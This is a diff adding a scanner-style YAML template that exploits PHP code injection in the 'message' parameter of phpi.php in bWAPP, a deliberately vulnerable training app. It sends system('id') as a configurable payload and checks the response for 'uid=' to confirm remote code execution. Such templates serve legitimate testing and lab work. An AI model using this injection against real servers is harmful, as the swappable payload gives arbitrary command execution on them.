@@ -1,0 +1,34 @@
+id: bwapp-php-code-injection
+info:
+  name: PHP Code Injection in phpi.php message parameter
+  severity: critical
+  description: >
+    The message parameter of phpi.php is passed into a PHP eval()-style sink, so
+    arbitrary PHP executes server-side. Here the payload runs an OS command via
+    PHP system(), confirming remote code execution.
+  reference:
+    - https://owasp.org/www-community/attacks/Code_Injection
+  cwe: CWE-94
+  tags: [rce, php, code-injection, injection]
+variables:
+  - name: target
+    required: true
+  - name: cookie
+    required: true
+  - name: payload
+    default: "system('id')"
+steps:
+  - http:
+      method: GET
+      url: "{{target}}/phpi.php?message={{url_encode(payload)}}"
+      headers:
+        Cookie: "{{cookie}}"
+      matchers:
+        - type: word
+          part: body
+          word: "uid="
+success:
+  all:
+    - type: word
+      part: body
+      word: "uid="
